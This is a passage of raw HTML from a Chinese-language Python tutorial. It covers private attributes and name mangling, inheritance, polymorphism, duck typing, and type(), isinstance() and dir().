class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">AttributeError: &#x27;Student&#x27; object has no attribute &#x27;age&#x27;</span><br></pre></td></tr></table></figure><h2 id="6-2-访问限制"><a href="#6-2-访问限制" class="headerlink" title="6.2 访问限制"></a>6.2 访问限制</h2><p>在 Class 内部，可以有<code>属性</code>和<code>方法</code>，而外部代码可以通过直接调用实例变量的方法来操作数据，这样，就隐藏了内部的复杂逻辑。</p><p>但是，从前面 Student 类的定义来看，外部代码还是可以自由地修改一个实例的<code>name</code>、<code>score</code>属性：</p><p><img src="https://cos.gjcloak.xyz/images01/20200805092809.png" alt="image-20200805092746185" title="image-20200805092746185"></p><p>如果要让内部属性不被外部访问，可以把属性的名称前加上两个下划线<code>__</code>，在 Python 中，实例的变量名如果以<code>__</code>开头，就变成了一个私有变量（private），只有内部可以访问，外部不能访问，所以，我们把 Student 类改一改：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line"></span><br><span class="line">    def __init__(self, name, score):</span><br><span class="line">        self.__name = name</span><br><span class="line">        self.__score = score</span><br><span class="line"></span><br><span class="line">    def print_score(self):</span><br><span class="line">        print(&#x27;%s: %s&#x27; % (self.__name, self.__score))</span><br></pre></td></tr></table></figure><p>改完后，对于外部代码来说，没什么变动，但是已经无法从外部访问<code>实例变量.__name</code>和<code>实例变量.__score</code>了：</p><p><img src="https://cos.gjcloak.xyz/images01/20200805093720.png" alt="image-20200805093718866" title="image-20200805093718866"></p><p>这样就确保了外部代码不能随意修改对象内部的状态，这样通过访问限制的保护，代码更加健壮。</p><p>但是如果外部代码要获取 name 和 score 怎么办？可以给 Student 类增加<code>get_name</code>和<code>get_score</code>这样的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    def get_name(self):</span><br><span class="line">        return self.__name</span><br><span class="line"></span><br><span class="line">    def get_score(self):</span><br><span class="line">        return self.__score</span><br></pre></td></tr></table></figure><p>如果又要允许外部代码修改 score 怎么办？可以再给 Student 类增加<code>set_score</code>方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    def set_score(self, score):</span><br><span class="line">        self.__score = score</span><br></pre></td></tr></table></figure><p>你也许会问，原先那种直接通过<code>bart.score = 99</code>也可以修改啊，为什么要定义一个方法大费周折？因为在方法中，可以对参数做检查，避免传入无效的参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    def set_score(self, score):</span><br><span class="line">        if 0 &lt;= score &lt;= 100:</span><br><span class="line">            self.__score = score</span><br><span class="line">        else:</span><br><span class="line">            raise ValueError(&#x27;bad score&#x27;)</span><br></pre></td></tr></table></figure><p>需要注意的是，在 Python 中，变量名类似<code>__xxx__</code>的，也就是以双下划线开头，并且以双下划线结尾的，是特殊变量，特殊变量是可以直接访问的，不是 private 变量，所以，不能用<code>__name__</code>、<code>__score__</code>这样的变量名。</p><p>有些时候，你会看到以一个下划线开头的实例变量名，比如<code>_name</code>，这样的实例变量外部是可以访问的，但是，按照约定俗成的规定，当你看到这样的变量时，意思就是，“虽然我可以被访问，但是，请把我视为私有变量，不要随意访问”。</p><p>双下划线开头的实例变量是不是一定不能从外部访问呢？其实也不是。不能直接访问<code>__name</code>是因为 Python 解释器对外把<code>__name</code>变量改成了<code>_Student__name</code>，所以，仍然可以通过<code>_Student__name</code>来访问<code>__name</code>变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; bart._Student__name</span><br><span class="line">&#x27;Bart Simpson&#x27;</span><br></pre></td></tr></table></figure><p>但是强烈建议你不要这么干，因为不同版本的 Python 解释器可能会把<code>__name</code>改成不同的变量名。</p><p>总的来说就是，Python 本身没有任何机制阻止你干坏事，一切全靠自觉。</p><p>最后注意下面的这种<strong>错误写法</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; bart = Student(&#x27;Bart Simpson&#x27;, 59)</span><br><span class="line">&gt;&gt;&gt; bart.get_name()</span><br><span class="line">&#x27;Bart Simpson&#x27;</span><br><span class="line">&gt;&gt;&gt; bart.__name = &#x27;New Name&#x27; # 设置__name变量！</span><br><span class="line">&gt;&gt;&gt; bart.__name</span><br><span class="line">&#x27;New Name&#x27;</span><br></pre></td></tr></table></figure><p>表面上看，外部代码“成功”地设置了<code>__name</code>变量，但实际上这个<code>__name</code>变量和 class 内部的<code>__name</code>变量不是一个变量！内部的<code>__name</code>变量已经被 Python 解释器自动改成了<code>_Student__name</code>，而外部代码给<code>bart</code>新增了一个<code>__name</code>变量。不信试试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; bart.get_name() # get_name()内部返回self.__name</span><br><span class="line">&#x27;Bart Simpson&#x27;</span><br></pre></td></tr></table></figure><h2 id="6-3-继承和多态"><a href="#6-3-继承和多态" class="headerlink" title="6.3 继承和多态"></a>6.3 继承和多态</h2><p>在 OOP 程序设计中，当我们定义一个 class 的时候，可以从某个现有的 class 继承，新的 class 称为子类（Subclass），而被继承的 class 称为基类、父类或超类（Base class、Super class）。</p><p>比如，我们已经编写了一个名为<code>Animal</code>的 class，有一个<code>run()</code>方法可以直接打印：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Animal(object):</span><br><span class="line">    def run(self):</span><br><span class="line">        print(&#x27;Animal is running...&#x27;)</span><br></pre></td></tr></table></figure><p>当我们需要编写<code>Dog</code>和<code>Cat</code>类时，就可以直接从<code>Animal</code>类继承：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class Dog(Animal):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">class Cat(Animal):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><p>对于<code>Dog</code>来说，<code>Animal</code>就是它的父类，对于<code>Animal</code>来说，<code>Dog</code>就是它的子类。<code>Cat</code>和<code>Dog</code>类似。</p><p>继承有什么好处？最大的好处是子类获得了父类的全部功能。由于<code>Animial</code>实现了<code>run()</code>方法，因此，<code>Dog</code>和<code>Cat</code>作为它的子类，什么事也没干，就自动拥有了<code>run()</code>方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dog = Dog()</span><br><span class="line">dog.run()</span><br><span class="line"></span><br><span class="line">cat = Cat()</span><br><span class="line">cat.run()</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Animal is running...</span><br><span class="line">Animal is running...</span><br></pre></td></tr></table></figure><p>当然，也可以对子类增加一些方法，比如 Dog 类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class Dog(Animal):</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        print(&#x27;Dog is running...&#x27;)</span><br><span class="line"></span><br><span class="line">    def eat(self):</span><br><span class="line">        print(&#x27;Eating meat...&#x27;)</span><br></pre></td></tr></table></figure><p>继承的第二个好处需要我们对代码做一点改进。你看到了，无论是<code>Dog</code>还是<code>Cat</code>，它们<code>run()</code>的时候，显示的都是<code>Animal is running...</code>，符合逻辑的做法是分别显示<code>Dog is running...</code>和<code>Cat is running...</code>，因此，对<code>Dog</code>和<code>Cat</code>类改进如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Dog(Animal):</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        print(&#x27;Dog is running...&#x27;)</span><br><span class="line"></span><br><span class="line">class Cat(Animal):</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        print(&#x27;Cat is running...&#x27;)</span><br></pre></td></tr></table></figure><p>再次运行，结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Dog is running...</span><br><span class="line">Cat is running...</span><br></pre></td></tr></table></figure><p>当子类和父类都存在相同的<code>run()</code>方法时，我们说，子类的<code>run()</code>覆盖了父类的<code>run()</code>，在代码运行的时候，总是会调用子类的<code>run()</code>。这样，我们就获得了继承的另一个好处：多态。</p><p>要理解什么是多态，我们首先要对数据类型再作一点说明。当我们定义一个 class 的时候，我们实际上就定义了一种数据类型。我们定义的数据类型和 Python 自带的数据类型，比如 str、list、dict 没什么两样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = list() # a是list类型</span><br><span class="line">b = Animal() # b是Animal类型</span><br><span class="line">c = Dog() # c是Dog类型</span><br></pre></td></tr></table></figure><p>判断一个变量是否是某个类型可以用<code>isinstance()</code>判断：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; isinstance(a, list)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance(b, Animal)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance(c, Dog)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><p>看来<code>a</code>、<code>b</code>、<code>c</code>确实对应着<code>list</code>、<code>Animal</code>、<code>Dog</code>这 3 种类型。</p><p>但是等等，试试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; isinstance(c, Animal)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><p>看来<code>c</code>不仅仅是<code>Dog</code>，<code>c</code>还是<code>Animal</code>！</p><p>不过仔细想想，这是有道理的，因为<code>Dog</code>是从<code>Animal</code>继承下来的，当我们创建了一个<code>Dog</code>的实例<code>c</code>时，我们认为<code>c</code>的数据类型是<code>Dog</code>没错，但<code>c</code>同时也是<code>Animal</code>也没错，<code>Dog</code>本来就是<code>Animal</code>的一种！</p><p>所以，在继承关系中，如果一个实例的数据类型是某个子类，那它的数据类型也可以被看做是父类。但是，反过来就不行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; b = Animal()</span><br><span class="line">&gt;&gt;&gt; isinstance(b, Dog)</span><br><span class="line">False</span><br></pre></td></tr></table></figure><p><code>Dog</code>可以看成<code>Animal</code>，但<code>Animal</code>不可以看成<code>Dog</code>。</p><p>要理解多态的好处，我们还需要再编写一个函数，这个函数接受一个<code>Animal</code>类型的变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def run_twice(animal):</span><br><span class="line">    animal.run()</span><br><span class="line">    animal.run()</span><br></pre></td></tr></table></figure><p>当我们传入<code>Animal</code>的实例时，<code>run_twice()</code>就打印出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; run_twice(Animal())</span><br><span class="line">Animal is running...</span><br><span class="line">Animal is running...</span><br></pre></td></tr></table></figure><p>当我们传入<code>Dog</code>的实例时，<code>run_twice()</code>就打印出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; run_twice(Dog())</span><br><span class="line">Dog is running...</span><br><span class="line">Dog is running...</span><br></pre></td></tr></table></figure><p>当我们传入<code>Cat</code>的实例时，<code>run_twice()</code>就打印出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; run_twice(Cat())</span><br><span class="line">Cat is running...</span><br><span class="line">Cat is running...</span><br></pre></td></tr></table></figure><p>看上去没啥意思，但是仔细想想，现在，如果我们再定义一个<code>Tortoise</code>类型，也从<code>Animal</code>派生：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Tortoise(Animal):</span><br><span class="line">    def run(self):</span><br><span class="line">        print(&#x27;Tortoise is running slowly...&#x27;)</span><br></pre></td></tr></table></figure><p>当我们调用<code>run_twice()</code>时，传入<code>Tortoise</code>的实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; run_twice(Tortoise())</span><br><span class="line">Tortoise is running slowly...</span><br><span class="line">Tortoise is running slowly...</span><br></pre></td></tr></table></figure><p>你会发现，新增一个<code>Animal</code>的子类，不必对<code>run_twice()</code>做任何修改，实际上，任何依赖<code>Animal</code>作为参数的函数或者方法都可以不加修改地正常运行，原因就在于多态。</p><p>多态的好处就是，当我们需要传入<code>Dog</code>、<code>Cat</code>、<code>Tortoise</code>……时，我们只需要接收<code>Animal</code>类型就可以了，因为<code>Dog</code>、<code>Cat</code>、<code>Tortoise</code>……都是<code>Animal</code>类型，然后，按照<code>Animal</code>类型进行操作即可。由于<code>Animal</code>类型有<code>run()</code>方法，因此，传入的任意类型，只要是<code>Animal</code>类或者子类，就会自动调用实际类型的<code>run()</code>方法，这就是多态的意思：</p><p>对于一个变量，我们只需要知道它是<code>Animal</code>类型，无需确切地知道它的子类型，就可以放心地调用<code>run()</code>方法，而具体调用的<code>run()</code>方法是作用在<code>Animal</code>、<code>Dog</code>、<code>Cat</code>还是<code>Tortoise</code>对象上，由运行时该对象的确切类型决定，这就是多态真正的威力：调用方只管调用，不管细节，而当我们新增一种<code>Animal</code>的子类时，只要确保<code>run()</code>方法编写正确，不用管原来的代码是如何调用的。这就是著名的“开闭”原则：</p><ul><li>对扩展开放：允许新增<code>Animal</code>子类；</li><li>对修改封闭：不需要修改依赖<code>Animal</code>类型的<code>run_twice()</code>等函数。</li></ul><p>继承还可以一级一级地继承下来，就好比从爷爷到爸爸、再到儿子这样的关系。而任何类，最终都可以追溯到根类 object，这些继承关系看上去就像一颗倒着的树。比如如下的继承树：</p><p><img src="https://cos.gjcloak.xyz/images01/20200805114618.png" alt="image-20200805114617811" title="image-20200805114617811"></p><h3 id="6-3-1-静态语言-vs-动态语言"><a href="#6-3-1-静态语言-vs-动态语言" class="headerlink" title="6.3.1 静态语言 vs 动态语言"></a>6.3.1 静态语言 vs 动态语言</h3><p>对于静态语言（例如 Java ）来说，如果需要传入<code>Animal</code>类型，则传入的对象必须是<code>Animal</code>类型或者它的子类，否则，将无法调用<code>run()</code>方法。</p><p>对于 Python 这样的动态语言来说，则不一定需要传入<code>Animal</code>类型。我们只需要保证传入的对象有一个<code>run()</code>方法就可以了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Timer(object):</span><br><span class="line">    def run(self):</span><br><span class="line">        print(&#x27;Start...&#x27;)</span><br></pre></td></tr></table></figure><p>这就是动态语言的“鸭子类型”，它并不要求严格的继承体系，一个对象只要“看起来像鸭子，走起路来像鸭子”，那它就可以被看做是鸭子。</p><p>Python 的“file-like object“就是一种鸭子类型。对真正的文件对象，它有一个<code>read()</code>方法，返回其内容。但是，许多对象，只要有<code>read()</code>方法，都被视为“file-like object“。许多函数接收的参数就是“file-like object“，你不一定要传入真正的文件对象，完全可以传入任何实现了<code>read()</code>方法的对象。</p><blockquote><p>小结：</p></blockquote><ul><li>继承可以把父类的所有功能都直接拿过来，这样就不必重零做起，子类只需要新增自己特有的方法，也可以把父类不适合的方法覆盖重写。</li><li>动态语言的鸭子类型特点决定了继承不像静态语言那样是必须的。</li></ul><h2 id="6-4-获取对象信息"><a href="#6-4-获取对象信息" class="headerlink" title="6.4 获取对象信息"></a>6.4 获取对象信息</h2><p>当我们拿到一个对象的引用时，如何知道这个对象是什么类型、有哪些方法呢？</p><h3 id="6-4-1-使用-type"><a href="#6-4-1-使用-type" class="headerlink" title="6.4.1 使用 type()"></a>6.4.1 使用 type()</h3><p>首先，我们来判断对象类型，使用<code>type()</code>函数：</p><p>基本类型都可以用<code>type()</code>判断：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; type(123)</span><br><span class="line">&lt;class &#x27;int&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; type(&#x27;str&#x27;)</span><br><span class="line">&lt;class &#x27;str&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; type(None)</span><br><span class="line">&lt;type(None) &#x27;NoneType&#x27;&gt;</span><br></pre></td></tr></table></figure><p>如果一个变量指向函数或者类，也可以用<code>type()</code>判断：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; type(abs)</span><br><span class="line">&lt;class &#x27;builtin_function_or_method&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; type(a)</span><br><span class="line">&lt;class &#x27;__main__.Animal&#x27;&gt;</span><br></pre></td></tr></table></figure><p>但是<code>type()</code>函数返回的是什么类型呢？它返回对应的 Class 类型。如果我们要在<code>if</code>语句中判断，就需要比较两个变量的 type 类型是否相同：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; type(123)==type(456)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; type(123)==int</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; type(&#x27;abc&#x27;)==type(&#x27;123&#x27;)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; type(&#x27;abc&#x27;)==str</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; type(&#x27;abc&#x27;)==type(123)</span><br><span class="line">False</span><br></pre></td></tr></table></figure><p>判断基本数据类型可以直接写<code>int</code>，<code>str</code>等，但如果要判断一个对象是否是函数怎么办？可以使用<code>types</code>模块中定义的常量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import types</span><br><span class="line">&gt;&gt;&gt; def fn():</span><br><span class="line">...     pass</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; type(fn)==types.FunctionType</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; type(abs)==types.BuiltinFunctionType</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; type(lambda x: x)==types.LambdaType</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; type((x for x in range(10)))==types.GeneratorType</span><br><span class="line">True</span><br></pre></td></tr></table></figure><h3 id="6-4-2-使用-isinstance"><a href="#6-4-2-使用-isinstance" class="headerlink" title="6.4.2 使用 isinstance()"></a>6.4.2 使用 isinstance()</h3><p>对于 class 的继承关系来说，使用<code>type()</code>就很不方便。我们要判断 class 的类型，可以使用<code>isinstance()</code>函数。</p><p>我们回顾上次的例子，如果继承关系是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object -&gt; Animal -&gt; Dog -&gt; Husky</span><br></pre></td></tr></table></figure><p>那么，<code>isinstance()</code>就可以告诉我们，一个对象是否是某种类型。先创建 3 种类型的对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a = Animal()</span><br><span class="line">&gt;&gt;&gt; d = Dog()</span><br><span class="line">&gt;&gt;&gt; h = Husky()</span><br></pre></td></tr></table></figure><p>然后，判断：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; isinstance(h, Husky)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><p>没有问题，因为<code>h</code>变量指向的就是 Husky 对象。</p><p>再判断：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; isinstance(h, Dog)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><p><code>h</code>虽然自身是 Husky 类型，但由于 Husky 是从 Dog 继承下来的，所以，<code>h</code>也还是 Dog 类型。换句话说，<code>isinstance()</code>判断的是一个对象是否是该类型本身，或者位于该类型的父继承链上。</p><p>因此，我们可以确信，<code>h</code>还是 Animal 类型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; isinstance(h, Animal)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><p>同理，实际类型是 Dog 的<code>d</code>也是 Animal 类型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; isinstance(d, Dog) and isinstance(d, Animal)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><p>但是，<code>d</code>不是 Husky 类型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; isinstance(d, Husky)</span><br><span class="line">False</span><br></pre></td></tr></table></figure><p>能用<code>type()</code>判断的基本类型也可以用<code>isinstance()</code>判断：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; isinstance(&#x27;a&#x27;, str)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance(123, int)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance(b&#x27;a&#x27;, bytes)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><p>并且还可以判断一个变量是否是某些类型中的一种，比如下面的代码就可以判断是否是 list 或者 tuple</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; isinstance([1, 2, 3], (list, tuple))</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance((1, 2, 3), (list, tuple))</span><br><span class="line">True</span><br></pre></td></tr></table></figure><blockquote><p>总是优先使用 isinstance() 判断类型，可以将指定类型及其子类“一网打尽”。</p></blockquote><h3 id="6-4-3-使用-dir"><a href="#6-4-3-使用-dir" class="headerlink" title="6.4.3 使用 dir()"></a>6.4.3 使用 dir()</h3><p>如果要获得一个对象的所有属性和方法，可以使用<code>dir()</code>函数，它返回一个包含字符串的 list，比如，获得一个 str 对象的所有属性和方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; dir(&#x27;ABC&#x27;)</span><br><span class="line">[&#x27;__add__&#x27;, &#x27;__class__&#x27;,..., &#x27;__subclasshook__&#x27;, &#x27;capitalize&#x27;, &#x27;casefold&#x27;,..., &#x27;zfill&#x27;]</span><br></pre></td></tr></table></figure><p>类似<code>__xxx__</code>的属性和方法在 Python 中都是有特殊用途的，比如<code>__len__</code>方法返回长度。在 Python 中，如果你调用<code>len()</code>函数试图获取一个对象的长度，实际上，在<code>len()</code>函数内部，它自动去调用该对象的<code>__len__()</code>方法，所以，下面的代码是等价的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; len(&#x27;ABC&#x27;)</span><br><span class="line">3</span><br><span class="line">&gt;&gt;&gt; &#x27;ABC&#x27;.__len__()</span><br><span class="line">3</span><br></pre></td></tr></table></figure><p>我们自己写的类，如果也想用<code>len(myObj)</code>的话，就自己写一个<code>__len__()</code>方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class MyDog(object):</span><br><span class="line">...     def __len__(self):</span><br><span class="line">...         return 100</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; dog = MyDog()</span><br><span class="line">&gt;&gt;&gt; len(dog)</span><br><span class="line">100</span><br></pre></td></tr></table></figure><p>剩下的都是普通属性或方法，比如<code>lower()</code>返回小写的字符串：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;ABC&#x27;.lower()</span><br><span class="line">&#x27;abc&#x27;</span><br></pre></td></tr></table></figure><p>仅仅把属性和方法列出来是不够的，配合<code>getattr()</code>、<code>setattr()</code>以及<code>hasattr()</code>，我们可以直接操作一个对象的状态：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class MyObject(object):</span><br><span class="line">...     def __init__(self):</span><br><span class="line">...         self.x = 9</span><br><span class="line">...     def power(self):</span><br><span class="line">...         return self.x * self.x</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; obj = MyObject()</span><br></pre></td></tr></table></figure><p>紧接着，可以测试该对象的属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hasattr(obj, &#x27;x&#x27;) # 有属性&#x27;x&#x27;吗？</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; obj.x</span><br><span class="line">9</span><br><span class="line">&gt;&gt;&gt; hasattr(obj, &#x27;y&#x27;) # 有属性&#x27;y&#x27;吗？</span><br><span class="line">False</span><br><span 